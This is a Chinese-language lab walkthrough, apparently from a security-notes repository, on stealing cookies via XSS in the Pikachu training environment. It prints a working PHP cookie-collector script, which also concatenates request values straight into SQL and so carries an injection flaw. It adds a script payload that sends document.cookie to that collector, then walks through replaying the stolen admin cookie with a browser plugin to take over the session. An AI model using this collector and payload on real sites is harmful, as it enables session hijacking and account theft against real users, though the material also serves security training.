## 获取cookie
### 1、获取cookie的js脚本
```shell script
root@f2e1fe30d200:/var/www/html/pkxss/xcookie# cat /var/www/html/pkxss/xcookie/cookie.php 
<?php
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

//这个是获取cookie的api页面

if(isset($_GET['cookie'])){
    $time=date('Y-m-d g:i:s');
    $ipaddress=getenv ('REMOTE_ADDR');
    $cookie=$_GET['cookie'];
    $referer=$_SERVER['HTTP_REFERER'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
    values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result=mysqli_query($link, $query);
}
header("Location:http://172.16.120.252:8085/pikachu/index.php"); //重定向到一个可信的网站,让用户迷惑的,如果想获取百度的cookie,最后可以重定向到百度的首页

?>
```
### 2、盗取cookie的payload
#### 下面的地址，是存放js脚本的地址，需要自己搭建
```shell script
<script>document.write('<img src="http://172.16.120.252:8085/pkxss/xcookie/cookie.php?cookie='+document.cookie+'"/>')</script>
```
插入一个img标签进来，img的源是：http://172.16.120.252:8085/pkxss/xcookie/cookie.php?cookie=
![image](https://github.com/498946975/Security/blob/master/images/xss_18.png)
### 3、提交成功之后，需要登陆网站后台进行查看，获取管理员后台的用户名和密码
http://172.16.120.252:8085/vul/xss/xssblind/admin_login.php
![image](https://github.com/498946975/Security/blob/master/images/xss_11.png)
### 4、然后到xss后台查看结果
http://172.16.120.252:8085/pkxss/pkxss_login.php
![image](https://github.com/498946975/Security/blob/master/images/xss_12.png)

### 5、获取cookie之后，需要用cookie进行登陆
### 6、首先下载插件cookie editor
![image](https://github.com/498946975/Security/blob/master/images/xss_13.png)
### 7、登陆后台页面
http://172.16.120.252:8085/vul/xss/xssblind/admin.php
后台登陆页面获取方式：
    1、暴力破解
    2、猜
    3、框架固定格式
    4、爬虫
由于没有登陆，则重定向到了http://172.16.120.252:8085/vul/xss/xssblind/admin_login.php
### 8、把刚才第四部的图片里面的cookie的信息，增加到cookie editor
![image](https://github.com/498946975/Security/blob/master/images/xss_14.png)
### 9、再次访问http://172.16.120.252:8085/vul/xss/xssblind/admin.php，就可以登陆了